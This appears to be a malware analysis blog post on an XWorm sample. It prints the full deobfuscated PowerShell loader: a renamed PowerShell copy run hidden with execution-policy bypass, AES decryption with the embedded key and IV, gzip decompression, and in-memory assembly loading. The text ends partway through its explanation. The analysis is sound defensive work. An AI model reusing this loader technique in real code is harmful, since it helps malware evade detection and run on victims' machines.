## XWorm - Batch Deobfuscation - .NET Loader

This sample starts off with some batch & PowerShell deobfuscation, revealing a .NET loader which we can debug using DnSpy and module breakpoints to reveal the payload.

SHA 256: e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f

## Initial Batch Script

This sample starts with an obfuscated batch script which looks like the following:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/15a2ff27-e269-40d7-96fc-586d9093245b)

From the fourth line onward we can see that many set commands are taking place, we also see a lot of commented-out strings which don't seem to make a lot of sense right now, denoted by the ::

Towards the end of the script, it appears that those variables are being called and executed:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/56b8f863-19b1-42db-951a-7bfcd968584e)

A quick way to make sense of this script is by commenting out the lines that clear the terminal and exit, and adding "echo" commands before the variables are called.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/be36953d-e183-4e48-9ff8-f861c071a512)

Now if we execute this new script, we get the following:

``` powershell
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "C:\Users\mzheader\Desktop\e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat.exe"
cd "C:\Users\mzheader\Desktop\"
"e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat.exe" -noprofile -windowstyle hidden -ep bypass -command $_CASH_JPyoO = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')
('C:\Users\mzheader\Desktop\e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat').Split([Environment]::NewLine);foreach ($_CASH_ealtD in $_CASH_JPyoO) { if ($_CASH_ealtD.StartsWith(':: @')) {  $_CASH_tFaoL = $_CASH_ealtD.Substring(4); break; }; };$_CASH_tFaoL =
[System.Text.RegularExpressions.Regex]::Replace($_CASH_tFaoL, '_CASH_', '');$_CASH_epUJg = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($_CASH_tFaoL);$_CASH_pFavC = New-Object System.Security.Cryptography.AesManaged;$_CASH_pFavC.Mode = [System.Security.Cryptography.CipherMode]::CBC;$_CASH_pFavC.Padding =
[System.Security.Cryptography.PaddingMode]::PKCS7;$_CASH_pFavC.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('GZ+NDDfWJdUL46CgERFNsma8kH1a1NyOqIvOPvKsrWA=');$_CASH_pFavC.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('5IgM8xAuhLV8mV1KzrCEvg==');$_CASH_traoF =
$_CASH_pFavC.CreateDecryptor();$_CASH_epUJg = $_CASH_traoF.TransformFinalBlock($_CASH_epUJg, 0, $_CASH_epUJg.Length);$_CASH_traoF.Dispose();$_CASH_pFavC.Dispose();$_CASH_SjOoQ = New-Object System.IO.MemoryStream(, $_CASH_epUJg);$_CASH_DLltN = New-Object System.IO.MemoryStream;$_CASH_VzeZp = New-Object
System.IO.Compression.GZipStream($_CASH_SjOoQ, [IO.Compression.CompressionMode]::Decompress);$_CASH_VzeZp.CopyTo($_CASH_DLltN);$_CASH_VzeZp.Dispose();$_CASH_SjOoQ.Dispose();$_CASH_DLltN.Dispose();$_CASH_epUJg = $_CASH_DLltN.ToArray();$_CASH_JzGOp = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')
($_CASH_epUJg);$_CASH_PUHAS = $_CASH_JzGOp.EntryPoint;$_CASH_PUHAS.Invoke($null, (, [string[]] ('')))
```
We can make this a bit easier to read by replacing all semi-colons with new lines:

```powershell
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "C:\Users\mzheader\Desktop\e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat.exe"
cd "C:\Users\mzheader\Desktop\"
"e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat.exe" -noprofile -windowstyle hidden -ep bypass -command $_CASH_JPyoO = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\mzheader\Desktop\e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat').Split([Environment]::NewLine)
foreach ($_CASH_ealtD in $_CASH_JPyoO) { if ($_CASH_ealtD.StartsWith(':: @')) {  $_CASH_tFaoL = $_CASH_ealtD.Substring(4)
 break
 }
 }
$_CASH_tFaoL = [System.Text.RegularExpressions.Regex]::Replace($_CASH_tFaoL, '_CASH_', '')
$_CASH_epUJg = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($_CASH_tFaoL)
$_CASH_pFavC = New-Object System.Security.Cryptography.AesManaged
$_CASH_pFavC.Mode = [System.Security.Cryptography.CipherMode]::CBC
$_CASH_pFavC.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$_CASH_pFavC.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('GZ+NDDfWJdUL46CgERFNsma8kH1a1NyOqIvOPvKsrWA=')
$_CASH_pFavC.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('5IgM8xAuhLV8mV1KzrCEvg==')
$_CASH_traoF = $_CASH_pFavC.CreateDecryptor()
$_CASH_epUJg = $_CASH_traoF.TransformFinalBlock($_CASH_epUJg, 0, $_CASH_epUJg.Length)
$_CASH_traoF.Dispose()
$_CASH_pFavC.Dispose()
$_CASH_SjOoQ = New-Object System.IO.MemoryStream(, $_CASH_epUJg)
$_CASH_DLltN = New-Object System.IO.MemoryStream
$_CASH_VzeZp = New-Object System.IO.Compression.GZipStream($_CASH_SjOoQ, [IO.Compression.CompressionMode]::Decompress)
$_CASH_VzeZp.CopyTo($_CASH_DLltN)
$_CASH_VzeZp.Dispose()
$_CASH_SjOoQ.Dispose()
$_CASH_DLltN.Dispose()
$_CASH_epUJg = $_CASH_DLltN.ToArray()
$_CASH_JzGOp = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($_CASH_epUJg)
$_CASH_PUHAS = $_CASH_JzGOp.EntryPoint
$_CASH_PUHAS.Invoke($null, (, [string[]] ('')))
```

**Command Line Breakdown:**
```powershell
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "C:\Users\mzheader\Desktop\e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat.exe"
cd "C:\Users\mzheader\Desktop\"
```
It appears that the script is firstly copying PowerShell and moving it to the same directory & filename as the executed script, changing directory to that directory, and executing the newly copied binary of PowerShell.
```powershell
"e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat.exe" -noprofile -windowstyle hidden -ep bypass -command $_CASH_JPyoO = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')
('C:\Users\mzheader\Desktop\e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat').Split([Environment]::NewLine)
```
A command is executed, with the reversed string of "ReadAllText" and it reads the initial batch script.
```powershell
foreach ($_CASH_ealtD in $_CASH_JPyoO) { if ($_CASH_ealtD.StartsWith(':: @')) {  $_CASH_tFaoL = $_CASH_ealtD.Substring(4)
```
From the initial script, it is looking for instances that start with ":: @" and takes everything from the 4th substring onwards, ie, all the content after the "::@"
The result is being saved as variable name "_CASH_tFaoL"
```powershell
$_CASH_tFaoL = [System.Text.RegularExpressions.Regex]::Replace($_CASH_tFaoL, '_CASH_', '')
```
The contents of _CASH_tFaoL is read, and all instances of "_CASH_" are replaced with nothing.
```powershell
$_CASH_epUJg = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($_CASH_tFaoL)
```
The string is decoded from Base64.
```powershell
$_CASH_pFavC = New-Object System.Security.Cryptography.AesManaged
$_CASH_pFavC.Mode = [System.Security.Cryptography.CipherMode]::CBC
$_CASH_pFavC.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$_CASH_pFavC.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('GZ+NDDfWJdUL46CgERFNsma8kH1a1NyOqIvOPvKsrWA=')
$_CASH_pFavC.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('5IgM8xAuhLV8mV1KzrCEvg==')
```
The decoded text is being AES-decrypted with Key "GZ+NDDfWJdUL46CgERFNsma8kH1a1NyOqIvOPvKsrWA=" and IV "5IgM8xAuhLV8mV1KzrCEvg==".
```powershell
$_CASH_SjOoQ = New-Object System.IO.MemoryStream(, $_CASH_epUJg)
$_CASH_DLltN = New-Object System.IO.MemoryStream
$_CASH_VzeZp = New-Object System.IO.Compression.GZipStream($_CASH_SjOoQ, [IO.Compression.CompressionMode]::Decompress)
```
The decrypted text is being decompressed with gunzip.
